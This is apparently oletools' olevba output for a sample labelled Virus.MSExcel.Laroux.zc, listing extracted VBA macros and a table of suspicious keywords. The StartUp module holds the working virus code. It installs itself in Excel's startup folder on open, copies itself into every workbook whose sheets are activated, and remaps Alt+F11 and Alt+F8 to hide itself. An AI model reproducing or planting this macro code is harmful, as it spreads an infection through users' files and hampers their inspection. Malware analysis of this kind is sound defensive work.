olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.zc-1f7b2e8a91ddfa22331f7cba3829b809734dfd92
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Laroux.zc-1f7b2e8a91ddfa22331f7cba3829b809734dfd92 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux.zc-1f7b2e8a91ddfa22331f7cba3829b809734dfd92 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux.zc-1f7b2e8a91ddfa22331f7cba3829b809734dfd92 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 模块1.bas 
in file: Virus.MSExcel.Laroux.zc-1f7b2e8a91ddfa22331f7cba3829b809734dfd92 - OLE stream: '_VBA_PROJECT_CUR/VBA/模块1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub dd()
Attribute dd.VB_ProcData.VB_Invoke_Func = "r\n14"
Set conn = CreateObject("ADODB.Connection")
    conn.Open "provider=microsoft.jet.oledb.4.0;extended properties=excel 8.0;data source=" & ThisWorkbook.FullName
    With Sheets("报销单")
        Sql = " select count(日期),工程号,sum(长途),sum(市内),sum(的士费),sum(手机费),sum(核定补助),sum(其它费用) from [日记$]  group by 工程号  having Sum(长途) > 0 Or Sum(市内) > 0 Or Sum(的士费) > 0 Or Sum(核定补助) > 0 Or Sum(手机费) > 0 Or Sum(其它费用) > 0"
        Sql1 = "select null,null,null,null,null,null,null,null"
        
       Worksheets(Array("报销单")).Select
      Range("E7").CopyFromRecordset conn.Execute(Sql1)
      Range("E8").CopyFromRecordset conn.Execute(Sql1)
      Range("E9").CopyFromRecordset conn.Execute(Sql1)
      Range("E10").CopyFromRecordset conn.Execute(Sql1)
      Range("E11").CopyFromRecordset conn.Execute(Sql1)
      Range("E12").CopyFromRecordset conn.Execute(Sql1)
      Range("E13").CopyFromRecordset conn.Execute(Sql1)
      Range("E14").CopyFromRecordset conn.Execute(Sql1)
      Range("E15").CopyFromRecordset conn.Execute(Sql1)
      Range("E16").CopyFromRecordset conn.Execute(Sql1)
    
    Range("E7").CopyFromRecordset conn.Execute(Sql)
    
    End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Laroux.zc-1f7b2e8a91ddfa22331f7cba3829b809734dfd92 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Laroux.zc-1f7b2e8a91ddfa22331f7cba3829b809734dfd92 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Laroux.zc-1f7b2e8a91ddfa22331f7cba3829b809734dfd92 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.zc-1f7b2e8a91ddfa22331f7cba3829b809734dfd92 - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!acop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub acop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub aback()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!acop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!acop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

